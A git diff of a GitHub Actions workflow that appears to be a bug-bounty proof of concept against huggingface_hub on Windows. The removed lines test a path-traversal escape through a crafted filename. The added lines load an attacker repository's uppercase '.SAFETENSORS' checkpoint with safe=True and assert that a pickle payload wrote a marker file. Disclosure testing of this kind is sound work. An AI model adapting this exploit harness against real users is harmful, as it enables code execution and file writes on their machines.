@@ -1,19 +1,21 @@
-name: Windows path validation
+name: Safetensors safe-mode Windows validation
 on:
   workflow_dispatch:
   push:
 jobs:
   validate:
     runs-on: windows-latest
-    timeout-minutes: 10
+    timeout-minutes: 15
     steps:
       - uses: actions/setup-python@v5
         with:
           python-version: "3.12"
-      - name: Install latest huggingface_hub main
+      - name: Install real PyTorch and current huggingface_hub main
         shell: pwsh
-        run: python -m pip install --disable-pip-version-check "huggingface_hub @ git+https://github.com/huggingface/huggingface_hub.git@main"
-      - name: Run harmless containment proof
+        run: |
+          python -m pip install --disable-pip-version-check torch --index-url https://download.pytorch.org/whl/cpu
+          python -m pip install --disable-pip-version-check "huggingface_hub @ git+https://github.com/huggingface/huggingface_hub.git@main"
+      - name: Run harmless end-to-end RCE proof
         shell: pwsh
         env:
           HF_HUB_DISABLE_XET: "1"
@@ -21,36 +23,40 @@ jobs:
           @'
           from pathlib import Path
           import os
+          import torch
           import huggingface_hub
-          from huggingface_hub import snapshot_download
-          from huggingface_hub._local_folder import _validate_relative_filename
+          from huggingface_hub import load_torch_model, snapshot_download
+          from huggingface_hub.serialization._torch import _is_safetensors
 
-          repo_id = "huntingislove/h1-winpath-space-poc-20260906"
-          crafted = "nested/.. /.. /h1-canary.txt"
-          root = Path(os.environ["RUNNER_TEMP"]) / "hf-h1-winpath"
-          local_dir = root / "victim-download"
-          local_dir.mkdir(parents=True, exist_ok=True)
-          escaped = root / "h1-canary.txt"
-          contained_literal = local_dir / "nested" / ".. " / ".. " / "h1-canary.txt"
+          class DummyModel:
+              def load_state_dict(self, state_dict, strict=False):
+                  print("load_state_dict_type=", type(state_dict).__name__)
+                  return (), ()
+
+          repo_id = "huntingislove/h1-safetensors-case-rce-20260906"
+          root = Path(os.environ["RUNNER_TEMP"]) / "hf-safetensors-e2e"
+          snapshot = Path(snapshot_download(repo_id, local_dir=root / "snapshot"))
+          marker = Path(os.environ["RUNNER_TEMP"]) / "hf-safetensors-rce-marker.txt"
+          checkpoint = snapshot / "model.SAFETENSORS"
 
           print("huggingface_hub_version=", huggingface_hub.__version__)
-          print("crafted=", repr(crafted))
-          _validate_relative_filename(crafted)
-          print("latest_validator=ACCEPT")
-          result = snapshot_download(repo_id, local_dir=local_dir)
-          print("snapshot_result=", result)
-          print("escaped_path=", escaped)
-          print("escaped_exists=", escaped.exists())
-          print("literal_path_exists=", contained_literal.exists())
-          if escaped.exists():
-              data = escaped.read_text()
-              print("escaped_content=", repr(data))
-              assert data.strip() == "HF-WINDOWS-PATH-CANARY"
-              print("CONFIRMED: attacker repository filename escaped local_dir on current Windows")
-          else:
-              print("tree=")
-              for path in root.rglob("*"):
-                  print(path.relative_to(root))
-              raise AssertionError("No containment escape observed")
+          print("torch_version=", torch.__version__)
+          print("checkpoint_exists=", checkpoint.exists())
+          print("windows_safe_glob=", [p.name for p in snapshot.glob("*.safetensors")])
+          print("safe_router=", _is_safetensors(checkpoint))
+          print("marker_before=", marker.exists())
+
+          load_error = "none"
+          try:
+              load_torch_model(DummyModel(), snapshot, safe=True)
+          except Exception as exc:
+              load_error = type(exc).__name__ + ": " + str(exc).splitlines()[0]
+          print("load_error=", load_error)
+          print("marker_after=", marker.exists())
+          if marker.exists():
+              print("marker_content=", marker.read_text())
+          assert marker.exists(), "safe=True did not execute the test payload"
+          assert marker.read_text() == "RCE_FROM_UPPERCASE_PICKLE"
+          print("CONFIRMED: load_torch_model(directory, safe=True) executed attacker pickle on Windows")
           '@ | Set-Content -Encoding UTF8 poc.py
           python poc.py
